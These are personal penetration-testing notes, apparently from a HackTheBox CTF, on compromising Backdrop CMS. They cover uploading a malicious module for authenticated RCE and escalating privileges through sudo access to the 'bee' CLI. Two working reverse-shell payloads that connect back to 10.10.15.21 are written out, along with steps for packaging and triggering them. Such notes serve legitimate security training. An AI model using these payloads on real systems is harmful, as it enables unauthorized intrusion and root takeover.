<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Backdrop CMS</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Backdrop CMS</h1><br/><p>[CTF D 47-49]</p><p></p><p><a name="Background"></a><h1>Background</h1></p><p><h2>URL Aliases</h2></p><p>IDK if the following is standard behavior, or if it&#39;s specific to Dog on HackTheBox.</p><p></p><p>Some links are accessible via <strong>/?q=RELATIVE_PATH</strong> &amp; must be accessed that way instead of directly navigating to the URL.</p><p></p><p>For example, <strong>/admin/modules/install</strong> didn&#39;t work, but <strong>/?q=admin/modules/install</strong> did.</p><p></p><p><h2>Installing Modules</h2></p><p>Modules consist of a <strong>.info </strong>file &amp; a <strong>.php</strong> file which are packaged together (e.g. in a <strong>.tar.gz</strong> file). Use this <a href="https://www.exploit-db.com/exploits/52021">PoC</a> to generate the <strong>.info</strong> file.</p><p></p><p>The PoC creates a <strong>.zip</strong> file, but Backdrop CMS doesn&#39;t natively support ZIP files by default. It supports tarball archives compressed with <a href="PrivEsc--Linux--SysAdmin_Stuff_43.html#Tar">GZIP</a> ( i.e. <strong>.tar.gz</strong>).</p><p></p><p><h3>Creating Archive File</h3></p><p>You <span style="color:#ff0000;">won&#39;t be able to upload</span> the tarball if you <span style="color:#ff0000;">created it using loose files</span>.</p><p></p><p>Instead you need to put the <span style="color:#ff0000;">necessary files in a directory</span> &amp; create the <span style="color:#ff0000;">archive using that directory</span>. For example, a tarball created like:</p><p></p><p><em>tar -zcvf shelly.tar.gz *</em></p><p></p><p>Results in a error when you try to upload it, saying something like <strong>.info file not found</strong>.</p><p></p><p><h1>Authenticated RCE</h1></p><p>Some versions of Backdrop are vulnerable to exploits like RCE.</p><p></p><p>You may be able to install a custom &quot;module&quot; which allows you to upload a PHP backdoor file.</p><p></p><p><h2>Installing Evil Module</h2></p><p>This <a href="https://www.exploit-db.com/exploits/52021">PoC</a> doesn&#39;t work, but you can use it to create the necessary<strong> .info</strong> file. See <a href="Recon_+_Services--WebApp--Software--Backdrop_CMS_105.html#Background">Background</a>.</p><p></p><p><h3>Setup</h3></p><p>Running the PoC creates<strong> ./shell/</strong>.</p><p></p><p><em>mkdir evil</em><em></em></p><p><em></em><em></em></p><p><em>cp shell/shell.info evil/</em></p><p></p><p><em>vim evil/evil.php</em></p><p></p><p><em>tar -zcvf evil.tar.gz evil</em></p><p></p><p><span class="subheading">Payload (evil.php)</span>: The PoC tries to create a PHP file that has a command bar (like <strong>simple-backdoor.php</strong>), but this <span style="color:#ff0000;">won&#39;t work</span>. You need a payload that will generate a Reverse Shell when the file is run. For example, using <a href="https://github.com/Komodo-pty/artemis-hunter">Artemis</a>.</p><p></p><p><strong>&lt;?php exec(&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.15.21/9998 0&gt;&amp;1&#39;&quot;);?&gt;</strong></p><p></p><p><h3>Installing Module</h3></p><p>After authenticating, there should be an option to manually install modules in the bar at the top of your screen (if you have enough privs).</p><p></p><p>You can also navigate to <strong>/?q=admin/modules/install</strong> (in my case, the URL <strong>/admin/modules/install</strong> led to a 404)</p><p></p><p><span style="color:#060f94;text-decoration:underline;">Q</span>: There&#39;s also an option to install a module from using a URL (instead of selecting a file to upload from your local system). Can you leverage this to <a href="Misc_Attacks--Network_Attacks_14.html#capture ntlm">Capture an NTLM Hash</a> using a UNC path if the server is running on a Windows machine?</p><p></p><p><h3>Triggering Payload</h3></p><p>In this case, you&#39;d always get a 404 when you try to navigate to the module you installed. This is why payloads like <strong>simple-backdoor.php</strong> won&#39;t work. However, a payload that spawns Reverse Shell will still trigger regardless of that.</p><p></p><p>The name of the module will be based off of the directory that you used to create the tarball (e.g. evil). The name of the INFO file doesn&#39;t seem to matter.</p><p></p><p><strong>/modules/evil/evil.php</strong>			(Syntax <strong>/modules/DIRECTORY/PAYLOAD.php</strong>)</p><p></p><p><h1>Privilege Escalation</h1></p><p><strong>bee</strong> is the CLi tool used to manage Backdrop CMS. If you can run it with elevated privileges (e.g. sudo or with SUID), you&#39;ll have multiple methods of PrivEsc. Run <strong>bee</strong> without any arguments for a list of commands that it supports.</p><p></p><p>There are multiple interesting options like interacting with the SQL using Backdrop&#39;s database credentials, &amp; changing a user&#39;s WebApp creds, but this will cover methods for RCE using PHP.</p><p></p><p><h2>Troubleshooting</h2></p><p>For example, when trying to us the <strong>eval</strong> command (you&#39;ll get the same type of error for various <strong>bee</strong> commands):</p><p></p><p> <strong>âœ˜  The required bootstrap level for &#39;eval&#39; is not ready.</strong></p><p> </p><p><h3> Run from Web Root</h3></p><p>You need to be in the root directory of the Backdrop site (where <strong>index.php</strong> is), or explicitly specify the path. For example, if the Web Root is <strong>/var/www/html/</strong>:</p><p></p><p><em>cd /var/www/html/</em></p><p></p><p>OR</p><p></p><p>Run <strong>bee</strong> with the <strong>--root=/var/www/html/</strong> arg.</p><p></p><p><h3>Verify Site Settings</h3></p><p>If that didn&#39;t work, check the site config to verify:</p><p><ul><li><strong>settings.php</strong> exists</li></ul></p><p><ul><li>File permissions allow access</li></ul></p><p><ul><li>The database connection info is correct</li></ul></p><p><ul><li>The web root is readable by the user running the command (even root needs readable paths)</li></ul></p><p></p><p><h2>RCE</h2></p><p>The <strong>eval</strong> command lets you run PHP code directly, &amp; the <strong>php-script</strong> command lets you specify a PHP file to execute.</p><p></p><p>Inside the Web Root directory, you can run a payload like:</p><p></p><p><em>sudo /usr/local/bin/bee eval &quot;exec(\&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.15.21/1337 0&gt;&amp;1&#39;\&quot;);&quot;</em></p></div>
</body>
</html>
